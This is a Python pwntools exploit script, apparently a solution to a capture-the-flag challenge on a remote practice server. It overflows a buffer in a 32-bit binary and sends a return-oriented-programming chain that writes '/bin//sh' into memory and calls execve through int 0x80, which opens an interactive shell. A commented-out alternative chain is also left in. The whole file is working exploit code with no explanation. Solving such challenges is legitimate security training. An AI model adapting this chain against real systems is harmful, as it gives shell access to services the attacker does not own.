from pwn import *
from LibcSearcher import *
#context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',28597)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


#pop_ecbx=0x0806e851 #: pop ecx ; pop ebx ; ret
pop_edcb=0x0806e850 #: pop edx ; pop ecx ; pop ebx ; ret



from struct import pack

# Padding goes here
p = b'a'*(0x1c+4)

p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bae06) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bae06) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e850) 
# pop edx ecx ebx; ret

p +=p32(0)+p32(0)+p32(0x080ea060)



'''
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054250) # xor eax, eax ; ret
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806e851) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054250) # xor eax, eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x080493e1) # int 0x80
'''

p += pack('<I', 0x080bae06) # pop eax ; ret

p+=p32(0xb)
p += pack('<I', 0x080493e1) # int 0x80
print(len(p))



ru(b'Your input :')
sl(p)

ii()
